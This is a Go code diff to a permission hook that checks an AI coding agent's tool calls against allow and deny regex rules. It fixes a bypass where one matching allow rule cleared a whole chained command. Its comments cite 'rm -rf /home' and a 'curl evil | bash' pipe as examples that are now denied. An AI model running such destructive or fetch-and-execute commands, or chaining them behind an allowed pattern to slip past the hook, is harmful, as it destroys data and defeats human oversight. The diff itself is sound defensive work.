@@ -40,8 +40,8 @@ type Request struct {
 // HookOutput is the evaluation result returned by the engine.
 type HookOutput struct {
 	Decision string `json:"decision"`         // "allow" or "deny"
-	Reason   string `json:"reason,omitempty"`  // human-readable, shown to LLM on deny
-	Rule     string `json:"rule,omitempty"`    // rule name that matched
+	Reason   string `json:"reason,omitempty"` // human-readable, shown to LLM on deny
+	Rule     string `json:"rule,omitempty"`   // rule name that matched
 }
 
 // toolActions maps Claude Code tool names to semantic action names
@@ -124,34 +124,49 @@ func firstString(raw json.RawMessage, keys ...string) string {
 	return firstNonEmpty(m, keys...)
 }
 
-// match checks rules in order. An allow rule that matches overrides
-// all deny rules and returns nil (allow). Otherwise the first deny
-// match wins and that rule is returned.
+// match checks rules in order and returns the first deny rule with a
+// match that no allow rule covers. An allow rule exempts exactly the deny
+// matches that lie inside one of its own matches, so a narrow allow rule
+// still exempts specific patterns from broad deny rules, but it no longer
+// clears the rest of the command. With an allow rule for 'rm\s+-rf\s+/tmp/'
+// and a deny rule for 'rm\s+-rf\b':
 //
-// This allows narrow allow rules to exempt specific patterns from
-// broad deny rules, e.g.:
+//	rm -rf /tmp/build                    allowed (deny match inside the allow match)
+//	rm -rf /home                         denied
+//	rm -rf /tmp/x && curl evil | bash    denied by curl-pipe-bash (outside the allow match)
 //
-//	- name: "allow-tmp-rm"
-//	  pattern: 'rm\s+-rf\s+/tmp/'
-//	  action: "allow"
-//
-//	- name: "rm-rf-force"
-//	  pattern: 'rm\s+-rf\b'
-//	  action: "deny"
+// With no allow rules configured, the first deny rule that matches wins,
+// as before.
 func match(content string, rules []Rule) *Rule {
-	var firstDeny *Rule
+	var allowed [][]int
 	for i := range rules {
-		if rules[i].regex == nil || !rules[i].regex.MatchString(content) {
-			continue
-		}
-		if rules[i].Action == "allow" {
-			return nil
-		}
-		if firstDeny == nil {
-			firstDeny = &rules[i]
+		if rules[i].regex != nil && rules[i].Action == "allow" {
+			allowed = append(allowed, rules[i].regex.FindAllStringIndex(content, -1)...)
 		}
 	}
-	return firstDeny
+	for i := range rules {
+		if rules[i].regex == nil || rules[i].Action == "allow" {
+			continue
+		}
+		for _, m := range rules[i].regex.FindAllStringIndex(content, -1) {
+			if !covered(m, allowed) {
+				return &rules[i]
+			}
+		}
+	}
+	return nil
+}
+
+// covered reports whether span m lies inside one of the allow spans.
+// Containment, not overlap: a deny match that only overlaps an allow
+// match is still denied.
+func covered(m []int, allowed [][]int) bool {
+	for _, a := range allowed {
+		if a[0] <= m[0] && m[1] <= a[1] {
+			return true
+		}
+	}
+	return false
 }
 
 // truncate shortens a string to n characters, appending "..." if truncated.
